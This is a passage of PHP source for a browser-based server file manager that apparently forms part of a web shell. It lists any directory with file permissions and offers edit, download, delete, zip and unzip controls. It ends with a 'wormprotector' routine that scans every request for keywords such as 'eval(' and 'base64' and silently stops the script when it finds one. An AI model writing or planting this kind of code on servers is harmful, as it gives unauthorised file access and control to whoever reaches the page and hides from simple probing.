<th bgcolor="gray" width=10%><span id="unzipdir1"><input type="checkbox" onclick="checkAll3(document.getElementById(\'list_form\'));" /> <input type="submit" value="Unzip" name="unzip_submit"/></span> <a style="text-decoration: none;color:white" href="javascript:UnZipDir()">to</a> <span style="display:none" id="unzipdir2"><input size=12 name="unzip_path" value="'.$dira.'"/></span></th>
</tr>';



			while (list($fileIndexValue, $file_name) = each ($file_array))
				{
				if (($fileIndexValue >= $page) AND ($fileIndexValue < $last_record))
					{

			if(is_file($dira.''.$file_name))
				{
				echo "<tr bgcolor='#4F4E4D'><td><a href='#' onclick=\"document.todo.dira.value='$dira';document.todo.page.value='$page';document.todo.filee.value='$file_name';document.todo.submit();\">$file_name</a>&nbsp;(". round(filesize($dira.''.$file_name)/1024,1) . "kb) ".my_perms($dira.$file_name)."</td>";
				if(is_writeable($dira.''.$file_name))
					{
					$file_name_array=explode('.',$file_name);
					$file_name_ext=$file_name_array[count($file_name_array)-1];
					echo '<td valign="middle" align="center">'.my_stat($dira.$file_name).'</td>';
					echo "<td valign='middle' align='center'><a href='#' onclick=\"document.todo.dira.value='$dira';document.todo.page.value='$page';document.todo.edit.value='$file_name';document.todo.submit();\">edit</a></td>";
					echo "<td valign='middle' align='center'><a href='#' onclick=\"document.todo.dira.value='$dira';document.todo.page.value='$page';document.todo.dofile.value='$file_name';document.todo.submit();\">dload</a></td>";
					echo "<td valign='middle' align='center'><input id='delete_id' type='checkbox' value='$file_name' name='del[]'/></td>";
					}
				else
					{
					echo '<td valign="middle" align="center">'.my_stat($dira.$file_name).'</td>';
					echo "<td>&nbsp;</td>";
					if(is_readable($dira.''.$file_name)) echo "<td valign='middle' align='center'><a href='#' onclick=\"document.todo.dira.value='$dira';document.todo.page.value='$page';document.todo.dofile.value='$file_name';document.todo.submit();\">dload</a></td>";
					else 	echo "<td>&nbsp;</td>";
					echo "<td>&nbsp;</td>";
					}
				if(is_readable($dira.''.$file_name))
					{
					if($file_name_ext!='zip')
						echo "<td valign='middle' align='center'><input id='zip_id' type='checkbox' value='$file_name' name='file2zip[]'/></td>";
					else
						echo "<td>&nbsp;</td>";
					if($file_name_ext=='zip')
						echo "<td valign='middle' align='center'><input id='unzip_id' type='checkbox' value='$file_name' name='arhiv[]'/></td>";
					else
						echo "<td>&nbsp;</td>";
					}
				else
					{
					echo "<td>&nbsp;</td>";
					echo "<td>&nbsp;</td>";
					}
				print '</tr>';
				}
			else 
					{
					if($file_name!='.' && $file_name!='..')
						{
						echo "<tr bgcolor='#4F4E4D'><td><a href='#' onclick=\"document.todo.dira.value='$dira$file_name';document.todo.submit();\">$file_name</a> ".my_perms($dira.$file_name)."</td>";
						echo '<td valign="middle" align="center">'.my_stat($dira.$file_name).'</td>';
						}
					else
						{
						echo "<tr bgcolor='#4F4E4D'><td><a href='#' onclick=\"document.todo.dira.value='$dira$file_name';document.todo.submit();\">$file_name</a></td>";
						echo "<td>&nbsp;</td>";
						}
					echo "<td>&nbsp;</td>";
					echo "<td>&nbsp;</td>";
					$dir_for_del=rtrim($dira,'/').'/'.$file_name;
					if($file_name!='.' && $file_name!='..' && is_writeable($dir_for_del))	
						{					
						echo "<td valign='middle' align='center'><input id='delete_id' type='checkbox' value='$dir_for_del' name='deldira[]'/></td>";
						}						
					elseif($file_name!='.' && $file_name!='..' && !is_writeable($dir_for_del))
						echo "<td>&nbsp;</td>";

					if(is_readable($dir_for_del) && $file_name!='.' && $file_name!='..')
						echo "<td valign='middle' align='center'><input id='zip_id' type='checkbox' value='$file_name' name='file2zip[]'/></td><td>&nbsp;</td>";
					elseif(!is_readable($dir_for_del) && $file_name!='.' && $file_name!='..')
						echo "<td>&nbsp;</td><td>&nbsp;</td>";

					if($file_name=='.' || $file_name=='..')
						echo "<td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td>";
					echo '</tr>';
					}	
				}
				}
print '</form></table>';
?>
</body>
</html>
<?php exit; }
else
	{
  	$post_arr=implode('.',$_POST);
  	$get_arr=implode('.',$_GET);
  	$cook_arr=implode('.',$_COOKIE);
  	$post_arr_key=implode('.',@array_flip($_POST));
  	$get_arr_key=implode('.',@array_flip($_GET));
  	$other_shtuki=@file_get_contents('php://input');
  	$cracktrack = strtolower($post_arr.$get_arr.$post_arr_key.$get_arr_key.$cook_arr_key.$other_shtuki);
  	$wormprotector = array('base64','user_pass','substring','or id=','eval(','nutch');
  	$checkworm = str_replace($wormprotector, '*', $cracktrack);
  	if ($cracktrack != $checkworm)
  	die("");
	}
?>
